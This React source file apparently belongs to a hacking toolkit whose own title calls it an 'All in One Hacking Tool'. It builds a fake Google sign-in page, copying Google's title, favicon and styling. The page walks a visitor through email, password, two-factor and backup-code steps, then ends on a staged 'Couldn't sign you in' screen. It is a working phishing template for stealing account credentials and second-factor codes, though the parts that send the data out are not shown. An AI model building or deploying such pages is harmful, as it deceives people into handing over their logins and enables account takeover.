import React, { useState, useEffect } from "react";
import LeftSide from "./components/LeftSide";
import EmailStep from "./components/EmailStep";
import PasswordStep from "./components/PasswordStep";
import TwoFAStep from "./components/TwoFAStep";
import Footer from "./components/Footer";
import AnotherWayStep from "./components/AnotherWayStep";
import CouldntSignInStep from "./components/CouldntSignInStep"; // Part 2 wala component yahan import ho ga

const GoogleSignInTemplate = () => {
  const [step, setStep] = useState(1);
  const [userEmail, setUserEmail] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    document.title = "Sign in - Google Accounts";

    let link = document.querySelector("link[rel~='icon']");
    if (!link) {
      link = document.createElement("link");
      link.rel = "icon";
      document.head.appendChild(link);
    }

    link.href = "https://www.google.com/favicon.ico";

    return () => {
      document.title =
        "Cypro Vexto | All in One Hacking Tool | Modern Indutrial All Hacking Modules";
      if (link) {
        link.href = "/logo.png";
      }
    };
  }, []);

  const handleStepChangeWithLoading = (nextStep) => {
    setIsLoading(true); // Loading bar show karo
    setTimeout(() => {
      setIsLoading(false); // Loading bar hide karo
      setStep(nextStep); // Aglay step par jao
    }, 1000); // 1-second delay
  };

  return (
    <>
      {isLoading && <div className="screen-overlay"></div>}

      <div className="google-page">
        <div className="signin-card">
          {isLoading && <div className="loading-bar"></div>}

          <LeftSide step={step} email={userEmail} />

          {step === 1 && (
            <EmailStep
              setStep={setStep}
              email={userEmail}
              setEmail={setUserEmail}
              setIsLoading={setIsLoading}
              isLoading={isLoading}
            />
          )}

          {step === 2 && (
            <PasswordStep
              setStep={setStep}
              email={userEmail}
              setIsLoading={setIsLoading}
              isLoading={isLoading}
            />
          )}

          {step === 3 && (
            <TwoFAStep
              setStep={setStep}
              email={userEmail}
              setIsLoading={setIsLoading}
              isLoading={isLoading}
              onTryAnotherWay={() => handleStepChangeWithLoading(4)} // Route to AnotherWayStep (Step 4)
            />
          )}

          {/* Step 4: AnotherWayStep -- Is mein option click par loading lagana hai */}
          {step === 4 && (
            <AnotherWayStep
              setStep={setStep}
              email={userEmail}
              onOptionClick={(optionId) => {
                if (optionId === "backup_code") {
                  // Agar backup code par click kare to Step 3 (8-digit screen) par jaye
                  handleStepChangeWithLoading(3);
                } else {
                  // Baqi kisi bhi option par click kare to Step 5 (Could not sign in) par jaye
                  handleStepChangeWithLoading(5);
                }
              }} // Kisi bhi option click par Step 5 par jao
            />
          )}

          {/* Step 5: "Couldn't sign you in" (Pic wali screen) */}
          {step === 5 && (
            <CouldntSignInStep
              email={userEmail}
              onTryAgain={() => handleStepChangeWithLoading(1)} // 'Try again' click par wapis Step 1 par
            />
          )}
        </div>

        <Footer />
      </div>

      <style>{`
        @import url('https://fonts.cdnfonts.com/css/google-sans?fonts=google-sans-regular,google-sans-light');

        .screen-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          background: rgba(0, 0, 0, 0.4); 
          z-index: 9999; 
        }

        *{
          margin:0;
          padding:0;
          box-sizing:border-box;
          font-family: "Google Sans", "Product Sans", Roboto, Arial, sans-serif;
          font-weight: 400; 
        }

        body{ background: #1f1f1f; }

        .google-page{
          width:100%;
          min-height:100vh;
          background:#1f1f1f;
          display:flex;
          flex-direction:column;
          justify-content:center;
          align-items:center;
          padding:24px;
        }

        .signin-card{
          position: relative; 
          width:100%;
          max-width:1140px;
          background:#0e0e0e;
          border-radius:28px;
          display:flex;
          justify-content:space-between;
          padding: 32px 40px; 
          transform: translateY(-2%);
        }

        /* LOADING BAR */
        .loading-bar {
          position: absolute;
          top: 0;
          left: 28px; 
          width: calc(100% - 56px); 
          height: 4px;
          background-color: rgba(168, 199, 250, 0.12); 
          overflow: hidden;
          z-index: 10;
        }

        .loading-bar::before {
          content: '';
          position: absolute;
          top: 0;
          left: -50%;
          height: 100%;
          width: 50%;
          background-color: #a8c7fa; 
          animation: google-loader 1.5s infinite ease-in-out;
        }

        @keyframes google-loader {
          0% { left: -50%; width: 30%; }
          50% { left: 20%; width: 80%; }
          100% { left: 100%; width: 30%; }
        }

        .left-side{
          width:50%;
          display:flex;
          flex-direction:column;
          padding-right: 16px;
        }

        .google-logo { margin-top: 10px; }
        .google-logo svg{ width:40px; height:40px; }

        .left-side h1{
          color:#fff;
          font-size:36px; 
          font-weight:300; 
          margin-top:28px;
          letter-spacing: -0.5px;
        }

        .left-side p{
          color:#e3e3e3;
          font-size:16px; 
          line-height:26px;
          margin-top:20px;
          max-width:480px; 
          transform: translateY(-7%);
        }

        .profile-pill {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          border: 1px solid #747775;
          border-radius: 32px;
          padding: 6px 12px 6px 6px;
          margin-top: 16px;
          cursor: pointer;
          transition: background 0.2s;
          width: fit-content;
        }
        .profile-pill:hover { background: rgba(255, 255, 255, 0.04); }
        .profile-icon { width: 20px; height: 20px; color: #c4c7c5; }
        .profile-email { color: #e3e3e3; font-size: 14px; font-weight: 500; }
        .profile-arrow { width: 16px; height: 16px; color: #c4c7c5; }

        .right-side{
          width:50%;
          display:flex;
          align-items:flex-start;
          justify-content:center;
          padding-top:56px; 
        }

        .slide-in-right {
          animation: slideInRight 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }

        @keyframes slideInRight {
          from {
            opacity: 0;
            transform: translateX(40px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }

        .right-side form{
          width:100%;
          max-width:500px; 
          display:flex;
          flex-direction:column;
          margin-top: 16px;
          position: relative;
          left: 20px;
        }

        .passkey-banner {
          background-color: #0842a0;
          border-radius: 8px;
          padding: 16px;
          display: flex;
          align-items: flex-start;
          gap: 16px;
          margin-bottom: 24px;
        }
        .passkey-icon { width: 20px; height: 20px; fill: #fff; flex-shrink: 0; margin-top: 2px;}
        .passkey-text { color: #fff; font-size: 14px; line-height: 20px; }

        .verify-text { color: #e3e3e3; font-size: 16px; margin-bottom: 20px; }

        .input-box{
          width:100%;
          height:56px; 
          position:relative;
          top: 15px;
        }

        .input-box input{
          width:100%;
          height:100%;
          background:transparent;
          border:1px solid #8d8d8d;
          border-radius:4px;
          outline:none;
          color:white;
          font-size:18px;
          padding:16px;
          transition:0.2s ease-in-out;
        }

        input:-webkit-autofill,
        input:-webkit-autofill:hover, 
        input:-webkit-autofill:focus, 
        input:-webkit-autofill:active{
            -webkit-box-shadow: 0 0 0 30px #0e0e0e inset !important;
            -webkit-text-fill-color: white !important;
            transition: background-color 5000s ease-in-out 0s;
        }

        .input-box label{
          position:absolute;
          top:50%;
          left:16px;
          transform:translateY(-50%);
          color:#b0b0b0;
          font-size:18px;
          background:#0e0e0e;
          padding:0 6px;
          transition:0.2s ease-in-out;
          pointer-events:none;
        }

        .input-box.focused label{ top:0; font-size:13px; color:#a8c7fa; }
        .input-box.focused input{ border:2px solid #a8c7fa; }
        .input-box.error input{ border:2px solid #f28b82 !important; }
        .input-box.error label{ color:#f28b82 !important; }

        .error-text{
          display:flex;
          align-items:center;
          gap:8px;
          color:#f28b82;
          margin-top:22px; 
          font-size:13px;
          width: 100%;
        }

        .error-icon{ width:16px; height:16px; fill:#f28b82; flex-shrink: 0; }

        .checkbox-container {
          display: flex;
          align-items: center;
          gap: 16px;
          margin-top: 24px;
          cursor: pointer;
          width: fit-content;
          position: relative;
        }

        .custom-checkbox-input {
          position: absolute;
          opacity: 0;
          cursor: pointer;
          height: 0;
          width: 0;
        }

        .custom-checkbox {
          display: flex;
          justify-content: center;
          align-items: center;
          width: 18px;
          height: 18px;
          border: 2px solid #c4c7c5;
          border-radius: 2px;
          transition: all 0.2s ease-in-out;
          position: relative;
          z-index: 2;
        }

        .custom-checkbox::before {
          content: "";
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 40px;
          height: 40px;
          border-radius: 50%;
          background: rgba(255, 255, 255, 0);
          transition: background 0.2s;
          z-index: -1;
        }

        .checkbox-container:hover .custom-checkbox {
          border-color: #e3e3e3;
        }

        .checkbox-container:hover .custom-checkbox::before {
          background: rgba(255, 255, 255, 0.08);
        }

        .custom-checkbox-input:checked ~ .custom-checkbox {
          background-color: #a8c7fa;
          border-color: #a8c7fa;
        }

        .checkmark {
          fill: #0e0e0e;
          width: 14px;
          height: 14px;
          opacity: 0;
          transition: opacity 0.2s ease-in-out;
        }

        .custom-checkbox-input:checked ~ .custom-checkbox .checkmark {
          opacity: 1;
        }

        .checkbox-label { color: #e3e3e3; font-size: 14px; }

        .forgot-link{
          margin-top: 26px; 
          color: #a8c7fa;
          text-decoration: none;
          font-size: 15px;
          width: fit-content;
          padding: 2px 8px; 
          border-radius: 100px; 
          transition: 0.2s;
          margin-left: -8px;
        }
        .forgot-link:hover{ background: rgba(255, 255, 255, 0.05); }

        .guest-text{ margin-top: 28px; color:#c7c7c7; font-size:15px; line-height:24px; }
        .guest-text a{ color: #a8c7fa; text-decoration:none; }
        .guest-text a:hover { text-decoration: underline; }

        .bottom-buttons{
          margin-top: 36px; 
          display:flex;
          justify-content:flex-end;
          align-items:center;
          gap:16px;
        }

        .try-another-way {
          background: transparent;
          border: none;
          color: #a8c7fa;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
          padding: 9px 16px;
          border-radius: 50px;
          transition: 0.2s;
        }
        .try-another-way:hover { background: rgba(168, 199, 250, .08); }

        .create-account-wrapper { position: relative; }

        .create-btn{
          background:transparent;
          border:none;
          color: #a8c7fa;
          font-size:15px;
          cursor:pointer;
          padding:9px 16px; 
          border-radius:50px;
          transition: 0.2s;
        }
        .create-btn:hover, .create-btn.active { background:rgba(168, 199, 250, .08); }

        .create-menu {
          position: absolute;
          top: calc(100% + 4px); 
          left: 0;
          background: #303134; 
          border-radius: 12px;
          width: max-content; 
          min-width: 200px; 
          box-shadow: 0 4px 12px rgba(0,0,0,0.5);
          z-index: 20;
          padding: 8px 0;
        }
        .create-menu ul { list-style: none; }
        .create-menu li {
          padding: 12px 16px; 
          color: #e8eaed;
          font-size: 14px;
          cursor: pointer;
          transition: background 0.2s;
        }
        .create-menu li:hover { background: rgba(255, 255, 255, 0.04); }

        .next-btn{
          background: #a8c7fa;
          border:none;
          color:#062e6f;
          height:44px;
          padding:0 28px;
          border-radius:999px;
          font-size:15px;
          cursor:pointer;
          transition: 0.2s;
        }
        .next-btn:hover { background: #b9d3fb; }

        .footer{ width:100%; max-width:1140px; display:flex; justify-content:space-between; align-items:center; margin-top: 4px; padding:0 8px; }
        .lang-dropdown-container { position: relative; left: 16px; }
        .dropdown-trigger { display: flex; align-items: center; gap: 6px; color: #c7c7c7; font-size: 13px; cursor: pointer; padding: 6px 10px; border-radius: 4px; transition: background 0.2s; margin-left: -10px; }
        .dropdown-trigger:hover, .dropdown-trigger.active { background: rgba(255, 255, 255, 0.05); }
        .custom-dropdown-menu { position: absolute; bottom: 100%; left: 0; background: #303134; border-radius: 8px; width: 250px; max-height: 350px; overflow-y: auto; box-shadow: 0 4px 12px rgba(0,0,0,0.5); z-index: 10; margin-bottom: 8px; padding: 8px 0; }
        .custom-dropdown-menu ul { list-style: none; }
        .custom-dropdown-menu li { padding: 12px 24px; color: #e8eaed; font-size: 14px; cursor: pointer; transition: background 0.2s; }
        .custom-dropdown-menu li:hover { background: rgba(255, 255, 255, 0.04); }
        .footer-links{ display:flex; gap:12px; }
        .footer-links a{ color:#c7c7c7; text-decoration:none; font-size:13px; transition: 0.2s; padding: 6px 10px; border-radius: 4px; }
        .footer-links a:hover{ background: rgba(255, 255, 255, 0.05); }

        @media(max-width:900px){
          .signin-card{ flex-direction:column; padding:32px; transform: none; }
          .left-side{ width:100%; padding-right: 0; }
          .right-side{ width:100%; padding-top:40px; justify-content: flex-start; }
          .right-side form { max-width: 100%; left: 0; }
          .left-side h1{ font-size:32px; }
          .loading-bar { left: 32px; width: calc(100% - 64px); }
        }

        @media(max-width:600px){
          .google-page { 
            padding: 0; 
            background: #0e0e0e; 
            justify-content: space-between; 
            min-height: 100vh; 
          }
          .signin-card { 
            border-radius: 0; 
            padding: 36px 24px; 
            flex: 1; 
            justify-content: flex-start; 
          }
          .footer { 
            padding: 16px 24px; 
            flex-direction: row; 
            flex-wrap: wrap; 
            justify-content: space-between; 
            align-items: center; 
            gap: 12px; 
          }
          .loading-bar { left: 0; width: 100%; }
          .right-side { padding-top: 32px; }
        }
      `}</style>
    </>
  );
};

export default GoogleSignInTemplate;
